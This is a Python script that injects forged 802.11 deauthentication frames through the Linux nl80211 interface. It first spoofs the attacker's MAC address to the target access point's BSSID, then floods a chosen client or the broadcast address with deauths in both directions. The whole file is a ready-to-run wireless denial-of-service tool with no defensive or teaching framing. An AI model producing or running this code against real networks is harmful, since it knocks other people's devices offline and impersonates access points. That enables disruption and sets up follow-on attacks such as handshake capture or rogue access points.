#!/usr/bin/env python3
"""
Deauth injection via nl80211 CMD_FRAME on monitor mode interface.
Uses the kernel-patched nl80211_tx_mgmt that now allows MONITOR iftype.
"""
import socket
import struct
import fcntl
import sys
import time

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16 + len(genlhdr) + len(attr), 16, NLM_F_REQUEST | NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off + 4)[0]
            s.close()
            return fid
        off += (alen + 3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen + 3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0' * (padded - alen)

def send_deauth(sock, fid, ifidx, freq, bssid, src_mac, target_mac, reason=7, seq_num=0):
    """Send a deauth frame via nl80211 CMD_FRAME."""
    fc = struct.pack('<H', 0x00c0)  # deauth
    duration = struct.pack('<H', 0)
    da = target_mac
    sa = src_mac
    bssid_field = bssid
    seq = struct.pack('<H', (seq_num & 0xfff) << 4)
    reason_code = struct.pack('<H', reason)

    frame = fc + duration + da + sa + bssid_field + seq + reason_code

    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', freq))
    attrs += nla(51, frame)
    attrs += struct.pack('HH', 4, 118)  # DONT_WAIT_FOR_ACK

    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16 + len(payload), fid, NLM_F_REQUEST | NLM_F_ACK, seq_num + 2, 0)

    sock.send(nlhdr + payload)

    try:
        resp = sock.recv(4096)
        nllen, nltype = struct.unpack_from('IH', resp, 0)
        if nltype == 2:
            errno = struct.unpack_from('i', resp, 16)[0]
            if errno != 0:
                print("  Error: %d" % errno)
            return errno == 0
        return True
    except socket.timeout:
        print("  Timeout")
        return False

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <iface> <bssid> <freq> [target_mac] [count] [interval]")
        print(f"  bssid: AP BSSID (e.g., 04:67:61:D6:DC:92)")
        print(f"  freq: channel frequency (e.g., 2412 for ch1)")
        print(f"  target_mac: client MAC or ff:ff:ff:ff:ff:ff for broadcast (default)")
        print(f"  count: number of deauths (default: 50)")
        print(f"  interval: seconds between frames (default: 0.1)")
        sys.exit(1)

    iface = sys.argv[1]
    bssid = bytes.fromhex(sys.argv[2].replace(':', ''))
    freq = int(sys.argv[3])
    target = bytes.fromhex(sys.argv[4].replace(':', '')) if len(sys.argv) > 4 else b'\xff\xff\xff\xff\xff\xff'
    count = int(sys.argv[5]) if len(sys.argv) > 5 else 50
    interval = float(sys.argv[6]) if len(sys.argv) > 6 else 0.1

    # Get our original MAC
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', iface.encode()))
    our_mac = info[18:24]
    sock.close()

    fid = get_nl80211_family_id()
    ifidx = get_ifindex(iface)

    print(f"Interface: {iface} (idx={ifidx})")
    print(f"Our MAC: {our_mac.hex(':')}")
    print(f"Target AP: {bssid.hex(':')}")
    print(f"Target client: {target.hex(':')}")
    print(f"Frequency: {freq} MHz")

    # Change interface MAC to AP's BSSID so SA check passes in cfg80211_mlme_mgmt_tx
    # Use raw ioctl SIOCSIFHWADDR since 'ip link set address' is not supported by driver
    import subprocess
    print(f"Spoofing MAC to AP BSSID: {bssid.hex(':')}")
    subprocess.run(['ip', 'link', 'set', iface, 'down'], check=False)

    # Try SIOCSIFHWADDR ioctl directly
    SIOCSIFHWADDR = 0x8924
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # struct ifreq: 16 bytes ifname + 2 bytes sa_family + 14 bytes sa_data
    ifr = struct.pack('16sH', iface.encode(), 1) + bssid + b'\x00' * 8
    try:
        fcntl.ioctl(sock.fileno(), SIOCSIFHWADDR, ifr)
        print("MAC changed via ioctl")
    except OSError as e:
        print(f"ioctl MAC change failed: {e}")
        print("Trying alternate approach...")
        # Write directly to the driver's sysfs if available
        try:
            with open(f'/sys/class/net/{iface}/address', 'w') as f:
                f.write(bssid.hex(':'))
            print("MAC changed via sysfs")
        except Exception as e2:
            print(f"sysfs failed too: {e2}")
            print("WARNING: MAC spoofing failed, deauth frames may be rejected")
    sock.close()
    subprocess.run(['ip', 'link', 'set', iface, 'up'], check=False)

    print(f"Sending {count} deauth frames...")

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(2)

    ok = 0
    fail = 0

    for i in range(count):
        # Send deauth from AP (our MAC is now spoofed to BSSID)
        if send_deauth(s, fid, ifidx, freq, bssid, bssid, target, reason=7, seq_num=i):
            ok += 1
        else:
            fail += 1

        # Also send deauth as if from client to AP (if unicast target)
        if target != b'\xff\xff\xff\xff\xff\xff':
            send_deauth(s, fid, ifidx, freq, bssid, target, bssid, reason=8, seq_num=i + count)

        if (i + 1) % 10 == 0:
            print(f"  Sent {i+1}/{count} (ok={ok}, fail={fail})")

        time.sleep(interval)

    s.close()
    print(f"Done: {ok} accepted, {fail} failed")

    # Restore original MAC
    print(f"Restoring original MAC: {our_mac.hex(':')}")
    import subprocess
    subprocess.run(['ip', 'link', 'set', iface, 'down'], check=False)
    SIOCSIFHWADDR = 0x8924
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifr = struct.pack('16sH', iface.encode(), 1) + our_mac + b'\x00' * 8
    try:
        fcntl.ioctl(sock.fileno(), SIOCSIFHWADDR, ifr)
    except OSError:
        pass
    sock.close()
    subprocess.run(['ip', 'link', 'set', iface, 'up'], check=False)

if __name__ == '__main__':
    main()
